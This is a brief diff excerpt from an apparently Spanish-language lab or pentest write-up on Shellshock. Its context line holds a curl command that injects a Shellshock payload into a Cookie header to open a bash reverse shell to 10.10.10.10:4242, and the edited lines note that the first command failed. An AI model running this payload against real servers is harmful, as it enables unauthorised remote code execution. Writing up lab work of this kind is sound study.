@@ -747,5 +747,5 @@ curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http:
 ```
 
 `Identificando`
-en este caso el primer c
+en este caso el primer comando no nos ha funcionado así que parece que no es vulnerable a `RCE` sin embargo probamos el seg
 ![[Pasted image 20240622195528.png]]
